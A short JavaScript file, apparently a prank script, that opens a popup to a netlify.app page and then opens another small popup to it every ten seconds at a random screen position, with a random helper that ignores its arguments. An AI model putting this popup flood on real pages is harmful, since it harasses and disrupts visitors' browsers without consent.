var w = screen.width
var h = screen.height

function getRandomInt_w(min, max) {
  return Math.floor(Math.random() * (2000 - 0 + 1)) + 0;
}

function run() {
	var strWindowFeatures = "location=yes,height=335,width=370,scrollbars=yes,status=yes";
	var URL = "https://spaghetti-0000.netlify.app/";
	var win = window.open(URL, "_blank", strWindowFeatures);
	setInterval(function() {
		wleft = getRandomInt_w();
		wtop = getRandomInt_w();
		console.log(wleft)
		console.log(wtop)
		var strWindowFeatures = "location=yes,height=335,width=370,scrollbars=yes,status=yes";
		var URL = "https://spaghetti-0000.netlify.app/";
		var win = window.open(URL, "_blank", 'height=335, width=370, left='+wleft+', top='+wtop);
	}, 10 * 1000);
}